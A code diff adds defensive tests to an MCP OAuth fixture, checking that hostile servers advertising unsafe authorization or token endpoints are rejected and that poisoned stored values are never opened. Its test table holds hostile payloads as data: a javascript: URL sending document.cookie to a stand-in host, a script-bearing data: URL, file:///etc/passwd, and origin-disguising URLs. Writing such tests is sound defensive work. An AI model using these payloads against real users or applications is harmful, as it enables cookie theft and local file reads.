@@ -72,6 +72,13 @@ type FixtureOptions = {
   dcr?: boolean;
   /** Serve authorization-server metadata under the RFC 8414 insertion path only. */
   wellKnownStyle?: "rfc8414" | "oidc-suffix";
+  /**
+   * Advertise this exact string as `authorization_endpoint` (PAP-17099). The
+   * value is whatever a hostile server wants — it is never a trusted URL.
+   */
+  authorizationEndpoint?: string;
+  /** Advertise this exact string as `token_endpoint` (PAP-17099). */
+  tokenEndpoint?: string;
   /** Value the token endpoint returns as the issuer, for `iss` tests. */
   tools?: unknown[];
 };
@@ -136,8 +143,8 @@ function installMcpOAuthFixture(options: FixtureOptions = {}) {
 
   const authorizationServerMetadata = () => ({
     issuer: ISSUER,
-    authorization_endpoint: `${ISSUER}/authorize`,
-    token_endpoint: `${ISSUER}/token`,
+    authorization_endpoint: options.authorizationEndpoint ?? `${ISSUER}/authorize`,
+    token_endpoint: options.tokenEndpoint ?? `${ISSUER}/token`,
     ...(options.dcr === false ? {} : { registration_endpoint: `${ISSUER}/register` }),
     ...(options.cimd ? { client_id_metadata_document_supported: true } : {}),
     code_challenge_methods_supported: ["S256"],
@@ -678,6 +685,112 @@ describeEmbeddedPostgres("generic remote MCP connections", () => {
       redirectUri: "https://other.fixture.test/api/tools/oauth/callback",
       actor: { actorType: "user", actorId: "board-user" },
     })).rejects.toMatchObject({ details: { code: "oauth_manual_client_rebinding_required" } });
+  });
+
+  /**
+   * PAP-17099 — the authorization endpoint is the one discovered value Paperclip
+   * hands to the operator's browser as a top-level navigation, so a hostile
+   * server must not be able to advertise a scheme that runs code in the board's
+   * origin, reads a local file, or downgrades the authorization request.
+   */
+  describe("unsafe advertised authorization endpoints", () => {
+    it.each([
+      ["javascript:", "javascript:fetch('https://evil.test/'+document.cookie)"],
+      ["data:", "data:text/html,<script>alert(document.domain)</script>"],
+      ["file:", "file:///etc/passwd"],
+      ["plaintext http", "http://evil.fixture.test/authorize"],
+      ["credentials disguising the origin", "https://mcp.fixture.test@evil.fixture.test/authorize"],
+      ["a fragment", "https://auth.fixture.test/authorize#@evil.fixture.test"],
+      ["a malformed url", "not-a-url"],
+    ])("refuses to connect when the server advertises %s", async (_label, authorizationEndpoint) => {
+      installMcpOAuthFixture({ auth: "oauth", authorizationEndpoint });
+      const company = await createCompany(db);
+      const service = toolAccessService(db);
+
+      await expect(service.connectGalleryApp(company.id, { link: MCP_URL, name: "Fixture hostile authorize" }))
+        .rejects.toMatchObject({ status: 422, details: { code: "oauth_authorization_endpoint_rejected" } });
+
+      // Nothing about the refused endpoint is persisted, so a later reconnect
+      // cannot pick it back up out of the connection config.
+      const [connection] = await db.select().from(toolConnections);
+      expect(JSON.stringify(connection?.config ?? {})).not.toContain(authorizationEndpoint);
+      await expect(db.select().from(toolOauthStates)).resolves.toHaveLength(0);
+    });
+
+    it("never navigates to a stored authorization endpoint that is unsafe", async () => {
+      installMcpOAuthFixture({ auth: "oauth" });
+      const company = await createCompany(db);
+      const service = toolAccessService(db);
+
+      const connected = await service.connectGalleryApp(company.id, { link: MCP_URL, name: "Fixture poisoned config" });
+      // A row written before the gate existed (or by any other writer) is not
+      // trusted just because it is in Paperclip's own database.
+      const poisonStoredAuthorizationUrl = async () => {
+        const [row] = await db.select().from(toolConnections).where(eq(toolConnections.id, connected.connectionId));
+        const poisoned = {
+          ...row!.config,
+          oauth: { ...(row!.config.oauth as Record<string, unknown>), authorizationUrl: "javascript:alert(1)" },
+        };
+        await db.update(toolConnections)
+          .set({ config: poisoned, transportConfig: poisoned })
+          .where(eq(toolConnections.id, connected.connectionId));
+      };
+      await poisonStoredAuthorizationUrl();
+
+      // The stored value is discarded and re-discovered rather than opened.
+      const start = await service.startOAuth(company.id, connected.connectionId, {
+        redirectUri: REDIRECT_URI,
+        actor: { actorType: "user", actorId: "board-user" },
+      });
+      expect(start.authorizationUrl.startsWith(`${ISSUER}/authorize?`)).toBe(true);
+
+      // And when re-discovery cannot supply a safe endpoint, sign-in fails
+      // closed with the reason instead of falling back to the stored value.
+      await db.delete(toolOauthStates);
+      await poisonStoredAuthorizationUrl();
+      vi.restoreAllMocks();
+      vi.spyOn(globalThis, "fetch").mockResolvedValue(jsonResponse({}, 404));
+      await expect(service.startOAuth(company.id, connected.connectionId, {
+        redirectUri: REDIRECT_URI,
+        actor: { actorType: "user", actorId: "board-user" },
+      })).rejects.toMatchObject({ status: 422, details: { code: "oauth_authorization_endpoint_rejected" } });
+      await expect(db.select().from(toolOauthStates)).resolves.toHaveLength(0);
+    });
+
+    it("refuses an unsafe token endpoint even when the authorization endpoint is fine", async () => {
+      installMcpOAuthFixture({ auth: "oauth", tokenEndpoint: "http://evil.fixture.test/token" });
+      const company = await createCompany(db);
+      const service = toolAccessService(db);
+
+      await expect(service.connectGalleryApp(company.id, { link: MCP_URL, name: "Fixture hostile token" }))
+        .rejects.toMatchObject({ status: 422, details: { code: "oauth_token_endpoint_rejected" } });
+    });
+
+    it("allows loopback http only outside an authenticated public deployment", async () => {
+      installMcpOAuthFixture({ auth: "oauth", authorizationEndpoint: "http://127.0.0.1:8930/authorize" });
+      const company = await createCompany(db);
+      // Default deployment = local development, where a loopback authorization
+      // server is how someone tests their own MCP server.
+      const service = toolAccessService(db);
+      const connected = await service.connectGalleryApp(company.id, { link: MCP_URL, name: "Fixture loopback authorize" });
+      const start = await service.startOAuth(company.id, connected.connectionId, {
+        redirectUri: REDIRECT_URI,
+        actor: { actorType: "user", actorId: "board-user" },
+      });
+      expect(new URL(start.authorizationUrl).origin).toBe("http://127.0.0.1:8930");
+
+      // Same connection, same discovered endpoint, authenticated public
+      // deployment: the local-development exception no longer applies.
+      await db.delete(toolOauthStates);
+      const publicService = toolAccessService(db, {
+        deploymentMode: "authenticated",
+        deploymentExposure: "public",
+      });
+      await expect(publicService.startOAuth(company.id, connected.connectionId, {
+        redirectUri: REDIRECT_URI,
+        actor: { actorType: "user", actorId: "board-user" },
+      })).rejects.toMatchObject({ status: 422, details: { code: "oauth_authorization_endpoint_rejected" } });
+    });
   });
 
   it("rejects a private-network endpoint in an authenticated public deployment", async () => {
